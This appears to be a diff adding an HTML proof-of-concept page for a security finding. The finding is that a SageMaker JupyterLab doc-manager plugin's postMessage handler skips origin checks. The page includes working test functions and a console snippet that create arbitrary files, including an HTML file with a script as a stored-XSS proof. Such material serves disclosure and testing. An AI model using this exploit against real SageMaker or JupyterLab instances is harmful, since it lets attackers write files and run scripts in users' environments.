@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Finding 4 Test — Doc Manager postMessage File Write</title>
+    <style>
+        body { font-family: monospace; max-width: 800px; margin: 40px auto; padding: 20px; }
+        .test-box { border: 1px solid #ccc; padding: 15px; margin: 15px 0; }
+        .info { background: #f0f0f0; }
+        .result { background: #fff; }
+        button { padding: 8px 16px; margin: 5px; cursor: pointer; }
+        pre { background: #1e1e1e; color: #d4d4d4; padding: 10px; overflow-x: auto; }
+        #log { white-space: pre-wrap; min-height: 100px; border: 1px solid #999; padding: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Finding 4: Doc Manager postMessage — No Origin Validation</h1>
+
+    <div class="test-box info">
+        <h3>About This Test</h3>
+        <p>The <code>@amzn/sagemaker-ui-doc-manager-jl-plugin</code> registers a
+        <code>window.addEventListener("message", ...)</code> handler that processes file
+        operations (OpenFile, OpenUntitledFile, OpenOrCreateFile) <b>without checking
+        <code>event.origin</code></b>.</p>
+
+        <p><b>Attack model:</b> This test demonstrates the <b>chain vector</b> — it should
+        be loaded inside JupyterLab (e.g., via Simple Browser or as notebook output) where
+        <code>window.parent</code> reaches the main JupyterLab window.</p>
+
+        <p><b>Standalone test:</b> If running outside JupyterLab, you can also test via
+        the browser console in the JupyterLab tab directly (see Manual Test section below).</p>
+    </div>
+
+    <div class="test-box">
+        <h3>Test 1: Create text file via OpenOrCreateFile</h3>
+        <p>Creates <code>finding4_proof.txt</code> with proof content.</p>
+        <button onclick="testOpenOrCreate()">Run Test 1</button>
+    </div>
+
+    <div class="test-box">
+        <h3>Test 2: Create HTML file via OpenUntitledFile</h3>
+        <p>Creates an untitled .html file with JS payload. If served by Jupyter, the JS executes (stored XSS).</p>
+        <button onclick="testOpenUntitled()">Run Test 2</button>
+    </div>
+
+    <div class="test-box">
+        <h3>Test 3: Open existing file via OpenFile</h3>
+        <p>Sends OpenFile for <code>finding4_proof.txt</code> (must exist first — run Test 1).</p>
+        <button onclick="testOpenFile()">Run Test 3</button>
+    </div>
+
+    <div class="test-box result">
+        <h3>Log</h3>
+        <div id="log"></div>
+    </div>
+
+    <div class="test-box info">
+        <h3>Manual Console Test</h3>
+        <p>Paste this into the browser console while on the JupyterLab/SageMaker Studio tab:</p>
+        <pre>
+// Creates a file at the specified path with attacker-controlled content
+window.postMessage({
+  type: "sagemaker:nbevent:OpenOrCreateFile",
+  payload: {
+    type: "file",
+    path: "finding4_console_test.txt",
+    content: "FINDING 4 CONFIRMED\\nFile created via postMessage without origin validation.\\nTimestamp: " + new Date().toISOString(),
+    format: "text"
+  }
+}, "*");
+        </pre>
+        <p>If the file appears in the file browser and auto-opens, the vulnerability is confirmed.</p>
+    </div>
+
+    <script>
+        function log(msg) {
+            var el = document.getElementById('log');
+            el.textContent += '[' + new Date().toISOString() + '] ' + msg + '\n';
+        }
+
+        function getTarget() {
+            // When loaded inside JupyterLab (e.g., Simple Browser iframe),
+            // window.parent is the main JupyterLab window where the handler runs.
+            // When loaded standalone, window.parent === window (self-test).
+            var target = window.parent || window;
+            if (target === window) {
+                log('WARNING: window.parent === window. This test is most effective when loaded inside JupyterLab (e.g., via Simple Browser).');
+            }
+            return target;
+        }
+
+        function testOpenOrCreate() {
+            var target = getTarget();
+            var testId = 'f4_' + Date.now();
+            var msg = {
+                type: 'sagemaker:nbevent:OpenOrCreateFile',
+                payload: {
+                    type: 'file',
+                    path: 'finding4_proof.txt',
+                    content: 'FINDING 4 CONFIRMED\n\nThis file was created via postMessage without origin validation.\nTest ID: ' + testId + '\nTimestamp: ' + new Date().toISOString() + '\n\nThe Doc Manager handler at @amzn/sagemaker-ui-doc-manager-jl-plugin\naccepted this message without checking event.origin.\n',
+                    format: 'text'
+                }
+            };
+            target.postMessage(msg, '*');
+            log('Sent OpenOrCreateFile for finding4_proof.txt (test ID: ' + testId + ')');
+            log('Check JupyterLab file browser for the new file.');
+        }
+
+        function testOpenUntitled() {
+            var target = getTarget();
+            var testId = 'f4_' + Date.now();
+            var msg = {
+                type: 'sagemaker:nbevent:OpenUntitledFile',
+                payload: {
+                    type: 'file',
+                    ext: '.html',
+                    path: '',
+                    content: '<html><body><h1>Finding 4 - Stored XSS Proof</h1><p>Test ID: ' + testId + '</p><script>document.write("<p style=\'color:red\'>JS executed in: " + document.domain + "</p>")<\/script></body></html>',
+                    format: 'text'
+                }
+            };
+            target.postMessage(msg, '*');
+            log('Sent OpenUntitledFile (.html) — check for new untitled HTML file.');
+        }
+
+        function testOpenFile() {
+            var target = getTarget();
+            var msg = {
+                type: 'sagemaker:nbevent:OpenFile',
+                payload: {
+                    path: 'finding4_proof.txt'
+                }
+            };
+            target.postMessage(msg, '*');
+            log('Sent OpenFile for finding4_proof.txt');
+        }
+
+        log('Finding 4 test loaded. Click buttons to send postMessages.');
+        if (window.parent !== window) {
+            log('Running inside iframe — window.parent is available (chain vector).');
+        } else {
+            log('Running standalone — use browser console for direct testing.');
+        }
+    </script>
+</body>
+</html>
